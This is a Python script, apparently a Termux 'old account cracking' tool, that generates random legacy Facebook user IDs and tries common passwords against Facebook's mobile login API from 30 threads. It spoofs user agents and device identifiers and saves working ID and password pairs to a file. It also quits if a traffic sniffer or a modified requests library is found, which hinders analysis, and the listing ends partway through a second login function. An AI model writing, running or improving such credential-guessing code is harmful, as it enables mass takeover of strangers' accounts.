import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

try:
    os.system('clear')
    print(' \x1b[38;5;46mAR King SERVER LOADING....')
    os.system('espeak -a 300 " Welcome to King  SERVER LOADING"')
    os.system('xdg-open https://m.me/j/AbYtvSKaVW5j4td4/')
    
    os.system('pkg update && pkg upgrade -y')
    os.system('xdg-open https://t.me/Rajeshvailoveyou')
    


    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
        continue
    class sec:
        __module__ = __name__
        __qualname__ = 'sec'

        def __init__(self):
            paths = ['/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py', '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py']
            for path in paths:
                if 'print' in open(path, 'r').read():
                    self.fuck()
                continue
            if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png') or os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
                self.fuck()
            return None

        def fuck(self):
            print(' \x1b[1;32m Congratulations ! ')
            self.linex()
            exit()

        def linex(self):
            print(f"    {W}--------------------------------------------")
            return None
    method = []
    oks = []
    cps = []
    loop = 0
    user = []
    X = '\x1b[1;37m'
    rad = '\x1b[38;5;196m'
    G = '\x1b[38;5;46m'
    Y = '\x1b[38;5;220m'
    PP = '\x1b[38;5;203m'
    RR = '\x1b[38;5;196m'
    GS = '\x1b[38;5;40m'
    W = '\x1b[1;37m'

    def windows():
        aV = str(random.choice(range(10, 20)))
        A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
        bV = str(random.choice(range(1, 36)))
        bx = str(random.choice(range(34, 38)))
        bz = f"5{bx}.{bV}"
        B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
        cV = str(random.choice(range(1, 36)))
        cx = str(random.choice(range(34, 38)))
        cz = f"5{cx}.{cV}"
        C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
        D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
        return random.choice([A, B, C, D])

    def wind():
        aV = str(random.choice(range(10, 20)))
        A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
        bV = str(random.choice(range(1, 36)))
        bx = str(random.choice(range(34, 38)))
        bz = f"5{bx}.{bV}"
        B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
        cV = str(random.choice(range(1, 36)))
        cx = str(random.choice(range(34, 38)))
        cz = f"5{cx}.{cV}"
        C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
        latest_build = random.randint(6000, 7000)
        latest_patch = random.randint(100, 200)
        D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
        return random.choice([A, B, C, D])

    def wind2():
        aV = str(random.choice(range(10, 20)))
        A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
        bV = str(random.choice(range(1, 36)))
        bx = str(random.choice(range(34, 38)))
        bz = f"5{bx}.{bV}"
        B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
        cV = str(random.choice(range(1, 36)))
        cx = str(random.choice(range(34, 38)))
        cz = f"5{cx}.{cV}"
        C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
        latest_build = random.randint(6000, 7200)
        latest_patch = random.randint(100, 200)
        D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
        return random.choice([A, B, C, D])
    sys.stdout.write('ìÜ©„Äêüß¨ ùêëùêÄùêâùêÑùêíùêá KINGüß¨„ÄëìÜ™ ')

    def ____banner____():
        if 'win' in sys.platform:
            os.system('cls')
        else:
            os.system('clear')
        print('   \x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n    \x1b[38;5;50m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  \x1b[34;1m‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó      \x1b[1;37m‚ñà‚ñà‚ïó\x1b[38;5;46m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\x1b[33;1m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\x1b[38;5;196m‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó\n    \x1b[38;5;50m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\x1b[34;1m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó     \x1b[1;37m‚ñà‚ñà‚ïë\x1b[38;5;46m‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù\x1b[33;1m‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù\x1b[38;5;196m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n    \x1b[38;5;50m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\x1b[34;1m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë     \x1b[1;37m‚ñà‚ñà‚ïë\x1b[38;5;46m‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  \x1b[33;1m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\x1b[38;5;196m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë\n    \x1b[38;5;50m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó\x1b[34;1m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë\x1b[1;37m‚ñà‚ñà   ‚ñà‚ñà‚ïë\x1b[38;5;46m‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  \x1b[33;1m‚ïö‚ïê‚ïê‚ïê‚ïê‚ñà‚ñà‚ïë\x1b[38;5;196m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë\n    \x1b[38;5;50m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\x1b[34;1m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\x1b[1;37m‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\x1b[38;5;46m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\x1b[33;1m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë\x1b[38;5;196m‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë\n    \x1b[38;5;50m‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù\x1b[34;1m‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù \x1b[1;37m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù \x1b[38;5;46m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\x1b[33;1m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù\x1b[38;5;196m‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù\n   \x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\x1b[38;5;196m(\x1b[1;37m\x1b[0;45mùêëùêÄùêâùêÑùêíùêá PRIVATE TOOLS\x1b[0;92m\x1b[38;5;196m)\x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n       \x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m\x1b[38;5;46mVERSION\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[0;44m2.1\x1b[0;92m\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m\x1b[0;45m11-Aug-2025\x1b[0;92m\x1b[38;5;196m) üáÆüá≥\n       \x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mAUTHOR\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mùêëùêÄùêâùêÑùêíùêá       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\n       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mGITHUB\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mùêëùêÄùêâùêÑùêíùêá-404   \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\n       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mSTATUS\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mOLD CRACKING \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\n\x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ')

    def creationyear(uid):
        if len(uid) == 15:
            if uid[:10] in ('1000000000',):
                RAJESH = '2009'
            elif uid[:9] in ('100000000',):
                RAJESH = '2009'
            elif uid[:8] in ('10000000',):
                RAJESH = '2009'
            elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'):
                RAJESH = '2009'
            elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'):
                RAJESH = '2010'
            elif uid[:6] in ('100001',):
                RAJESH = '2010'
            elif uid[:6] in ('100002', '100003'):
                RAJESH = '2011'
            elif uid[:6] in ('100004',):
                RAJESH = '2012'
            elif uid[:6] in ('100005', '100006'):
                RAJESH = '2013'
            elif uid[:6] in ('100007', '100008'):
                RAJESH = '2014'
            elif uid[:6] in ('100009',):
                RAJESH = '2015'
            elif uid[:5] in ('10001',):
                RAJESH = '2016'
            elif uid[:5] in ('10002',):
                RAJESH = '2017'
            elif uid[:5] in ('10003',):
                RAJESH = '2018'
            elif uid[:5] in ('10004',):
                RAJESH = '2019'
            elif uid[:5] in ('10005',):
                RAJESH = '2020'
            elif uid[:5] in ('10006',):
                RAJESH = '2021'
            elif uid[:5] in ('10009',):
                RAJESH = '2023'
            elif uid[:5] in ('10007', '10008'):
                RAJESH = '2022'
            else:
                RAJESH = ''
        elif len(uid) in (9, 10):
            RAJESH = '2008'
        elif len(uid) == 8:
            RAJESH = '2007'
        elif len(uid) == 7:
            RAJESH = '2006'
        elif len(uid) == 14:
            if uid[:2] in ('61',):
                RAJESH = '2024'
        else:
            RAJESH = ''
        return RAJESH

    def clear():
        os.system('clear')

    def linex():
        print('\x1b[38;5;48m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ')

    def BNG_71_():
        ____banner____()
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mOLD CLONE')
        linex()
        __Jihad__ = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
        if __Jihad__ in ('A', 'a', '01', '1'):
            old_clone()
        else:
            print(f"\n    {rad}CHOOSE VALID OPTION... ")
            time.sleep(2)
            BNG_71_()

    def old_clone():
        ____banner____()
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mAll series')
        linex()
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m100003/4 series')
        linex()
        print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m2009 series')
        linex()
        _input = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mCHOICE  {W}: {Y}")
        if _input in ('A', 'a', '01', '1'):
            old_One()
        elif _input in ('B', 'b', '02', '2'):
            old_Tow()
        elif _input in ('C', 'c', '03', '3'):
            old_Tree()
        else:
            print(f"\n[√ó]{rad} Choose Value Option... ")
            BNG_71_()

    def old_One():
        user = []
        ____banner____()
        print('       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mOLD CODE\x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m 2010-2014')
        ask = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
        linex()
        ____banner____()
        print('       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mEXAMPLE\x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m20000 / 30000 / 99999')
        limit = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
        linex()
        star = '10000'
        for _ in range(int(limit)):
            data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
            user.append(data)
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mMethod 2')
        linex()
        meth = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
        with tred(max_workers=30) as pool:
            ____banner____()
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
            linex()
            for mal in user:
                uid = star + mal
                if meth == '1':
                    pool.submit(login_1, uid)
                elif meth == '2':
                    pool.submit(login_5, uid)
                else:
                    print(f"    {rad}[!] INVALID METHOD SELECTED")
                    return None
                continue

    def old_Tow():
        user = []
        ____banner____()
        print(f"        \x1b[666(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mOld code {Y}:{G} 2010-2017")
        ask = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mSelect {Y}:{G} ")
        linex()
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mExample {Y}:{G} 20000 / 30000 / 99999")
        limit = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m Select {Y}:{G} ")
        linex()
        prefixes = ['100003', '100004']
        for _ in range(int(limit)):
            prefix = random.choice(prefixes)
            suffix = ''.join(random.choices('0123456789', k=9))
            uid = prefix + suffix
            user.append(uid)
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mMethod 1')
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mMethod 2')
        linex()
        meth = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
        with tred(max_workers=30) as pool:
            ____banner____()
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
            linex()
            for uid in user:
                if meth == '1':
                    pool.submit(login_1, uid)
                elif meth == '2':
                    pool.submit(login_5, uid)
                else:
                    print(f"    {rad}[!] INVALID METHOD SELECTED")
                    return None
                continue

    def old_Tree():
        user = []
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2017")
        ask = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mSELECT {Y}:{G} ")
        linex()
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
        limit = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
        linex()
        prefix = '1000002'
        for _ in range(int(limit)):
            suffix = ''.join(random.choices('0123456789', k=8))
            uid = prefix + suffix
            user.append(uid)
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m Method 1')
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46m Method 2')
        linex()
        meth = input(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
        with tred(max_workers=30) as pool:
            ____banner____()
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
            print(f"       \x1b[38;5;196m(\x1b[1;37m‚òÖ\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
            linex()
            for uid in user:
                if meth == '1':
                    pool.submit(login_5, uid)
                elif meth == '2':
                    pool.submit(login_5, uid)
                else:
                    print(f"    {rad}[!] INVALID METHOD SELECTED")
                    return None
                continue

    def login_1(uid):
        global loop
        session = requests.session()
        try:
            sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37müß¨ùêëùêÄùêâùêÑùêíùêá-M1\x1b[38;5;196müáÆüá≥)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
            sys.stdout.flush()
            for pw in ('123456789', '123456', '1234567', '12345678', '1234567890'):
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                     'password': str(pw),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US' }
                data.update({
                    'method': 'auth.login',
                    'fb_api_req_friendly_name': 'authenticate',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'api_key': '882a8490361da98702bf97a021ddc14d' })
                headers = {
                    'User-Agent': wind(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': '25227',
                    'X-FB-SIM-HNI': '29752',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in res:
                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(üåè\x1b[1;37mRAJESHüß¨\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJESH-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return None
                if 'www.facebook.com' in res.get('error', {}).get('message', ''):
                    print(f"\r\r\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(üåè\x1b[1;37mRAJESHüß¨\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJESH-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return None
                continue
            loop += 1
        except Exception:
            time.sleep(5)

    def login_2(uid):
        global loop
